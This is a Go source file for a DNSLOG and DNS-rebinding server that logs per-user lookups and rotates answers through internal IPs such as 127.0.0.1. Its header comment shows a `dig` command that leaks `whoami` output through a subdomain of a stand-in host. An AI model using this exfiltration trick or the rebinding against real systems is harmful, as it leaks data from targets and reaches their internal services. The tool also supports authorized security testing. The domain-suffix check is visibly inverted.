package main

import (
	"net"
	"runtime"
	"strings"
	"sync"
	"time"

	"models"

	"github.com/miekg/dns"
)

/*
1. 注册DNS并将NS记录指向主机IP
	ns.example.com => 10.10.10.10
2. 登录并添加用户，获取业务域名
	userXXXX.exmaple.com
3. 访问DNS，生成DNSLOG
	dig userXXXX.exmaple.com
	dig `whoami`.userXXX.example.com
4. 访问HTTP，生成HTTPLOG
	curl http://userXXXX.exmaple.com/log
5. Dns rebinding
	配置rebinding记录下 127.0.0.1,127.0.0.2
	dig r.userXXXX.exmaple.com
		127.0.0.1
	dig r.userXXXX.exmaple.com
		127.0.0.2
*/

const (
	notIPQuery = iota
	_IP4Query
	_IP6Query
)

var (
	reserveNames = map[string]bool{
		"www": true,
		"app": true,
		"ns":  true,
		"api": true,
		"m":   true,
	}
)

type DnsServerConfig struct {
	Domain             string
	RTimeout, WTimeout time.Duration
	V4, V6             net.IP
}

type DnsServer struct {
	DnsServerConfig
	cache *Cache

	tcpServer *dns.Server
	udpServer *dns.Server

	wg      sync.WaitGroup
	handler dns.Handler
}

func NewDnsServer(cfg *DnsServerConfig, c *Cache) (*DnsServer, error) {
	if strings.HasSuffix(cfg.Domain, ".") {
		cfg.Domain = cfg.Domain + "."
	}

	addr := ""
	if runtime.GOOS == "windows" {
		addr = ":10053"
	}

	handler := dns.NewServeMux()
	var s = &DnsServer{
		DnsServerConfig: *cfg,
		cache:           c,
		handler:         handler,
		tcpServer: &dns.Server{
			Addr:         addr,
			Net:          "tcp",
			Handler:      handler,
			ReadTimeout:  cfg.RTimeout,
			WriteTimeout: cfg.WTimeout,
		},
		udpServer: &dns.Server{
			Addr:         addr,
			Net:          "udp",
			Handler:      handler,
			UDPSize:      65535,
			ReadTimeout:  cfg.RTimeout,
			WriteTimeout: cfg.WTimeout,
		},
	}
	handler.HandleFunc(cfg.Domain, s.Do)
	return s, nil
}

func (s *DnsServer) Run() {
	var wg sync.WaitGroup

	wg.Add(2)
	go func() {
		defer wg.Done()
		s.tcpServer.ListenAndServe()
	}()
	go func() {
		defer wg.Done()
		s.udpServer.ListenAndServe()
	}()

	wg.Wait()
}

func (s *DnsServer) Shutdown() {
	s.udpServer.Shutdown()
	s.tcpServer.Shutdown()
	s.wg.Wait()
}

func (s *DnsServer) log(rcd *DnsRecord) {
	s.wg.Add(1)
	go func() {
		defer s.wg.Done()
		cache := s.cache
		//TODO: store
		cache.Input() <- rcd
	}()
}

func (h *DnsServer) Do(w dns.ResponseWriter, req *dns.Msg) {
	q := req.Question[0]

	remoteAddr, ok := w.RemoteAddr().(*net.UDPAddr)
	var remoteIp net.IP
	if ok {
		remoteIp = remoteAddr.IP
	} else {
		remoteAddr, _ := w.RemoteAddr().(*net.TCPAddr)
		remoteIp = remoteAddr.IP
	}

	queryType := h.isIPQuery(q)
	cache := h.cache

	respV4 := func(ip net.IP, ttl uint32, uid int64) {
		m := new(dns.Msg)
		m.SetReply(req)
		rr_header := dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    uint32(ttl),
		}
		a := &dns.A{rr_header, ip}
		m.Answer = append(m.Answer, a)
		w.WriteMsg(m)
		h.log(&DnsRecord{
			Uid:    uid,
			Domain: strings.TrimSuffix(q.Name, "."),
			Ctime:  time.Now(),
			Ip:     remoteIp.String(),
		})
		return
	}
	respV6 := func(ip net.IP, ttl uint32) {
		m := new(dns.Msg)
		m.SetReply(req)
		rr_header := dns.RR_Header{
			Name:   q.Name,
			Rrtype: dns.TypeAAAA,
			Class:  dns.ClassINET,
			Ttl:    uint32(ttl),
		}
		aaaa := &dns.AAAA{rr_header, ip}
		m.Answer = append(m.Answer, aaaa)
		w.WriteMsg(m)

		// NOT LOG
		// h.log(&DnsRecord{
		// 	Domain: strings.TrimSuffix(q.Name, "."),
		// 	Ctime:  time.Now(),
		// 	Ip:     remoteIp.String(),
		// })
		return
	}
	getIPv4 := func(user *models.TblUser) net.IP {
		if user == nil || len(user.Rebind) == 0 {
			return h.V4
		}

		idx := time.Now().Second() % len(user.Rebind)
		return net.ParseIP(user.Rebind[idx])
	}

	var uid int64
	switch queryType {
	case _IP4Query:
		//r.u3yszl9nidbsx8p9.example.com.
		_, shortId, isRebind := parseDomain(q.Name, h.Domain)
		if shortId == "" {
			respV4(h.V4, 0, uid)
			return
		}
		if reserveNames[shortId] {
			respV4(h.V4, 600, uid)
			return
		}

		v, exist := cache.Get(shortId + ".suser")
		var user *models.TblUser
		if exist {
			user = v.(*models.TblUser)
			uid = user.Id
		}

		//rebinding
		if isRebind && user != nil {
			respV4(getIPv4(user), 0, uid)
			return
		}
		respV4(h.V4, 0, uid)
		return

	case _IP6Query:
		respV6(h.V6, 600)

		// _, shortId, isRebind := parseDomain(q.Name, h.Domain)
		// if shortId == "" {
		// 	respV6(h.V6, 0)
		// 	return
		// }
		// if reserveNames[shortId] {
		// 	respV6(h.V6, 600)
		// 	return
		// }
		// _ = isRebind
		// //TODO: ipv6 rebind

		// respV6(h.V6, 0)
		//return

	default:
	}

	dns.HandleFailed(w, req)
	//w.WriteMsg(mesg)
}

func (h *DnsServer) isIPQuery(q dns.Question) int {
	if q.Qclass != dns.ClassINET {
		return notIPQuery
	}
	switch q.Qtype {
	case dns.TypeA:
		return _IP4Query
	case dns.TypeAAAA:
		return _IP6Query
	default:
		return notIPQuery
	}
}
